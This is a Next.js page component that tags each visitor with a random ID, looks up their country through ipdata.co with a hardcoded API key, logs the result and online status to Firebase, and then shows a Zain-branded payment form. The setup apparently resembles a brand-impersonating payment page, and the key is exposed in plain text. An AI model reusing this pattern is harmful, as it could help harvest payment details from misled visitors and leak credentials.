"use client"
import Payment from '@/components/pm'
import ZainPaymentForm from '@/components/zms'
import { addData } from '@/lib/firebase';
import { setupOnlineStatus } from '@/lib/util';
import { useCallback, useEffect, useState } from 'react'
import Loader from "@/components/loader"

const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;


export default function Appliction(){
  const [step,setstep]=useState(1)
const [show,setShow]=useState(false)
  const getLocationAndLog = useCallback(async () => {
    if (!newVisitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: newVisitorId,
        country: country,
        action: "page_load"
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(newVisitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: newVisitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, []);

  useEffect(() => {
    getLocationAndLog().then(()=>{
      
    });
  }, []);


useEffect(()=>{
if(newVisitorId){
  setShow(true)
}
},[])


return (<>
{step ===1 && show? <ZainPaymentForm setStepNumber={setstep} />:step ===2? <Payment/>:<Loader/> }
</>)
}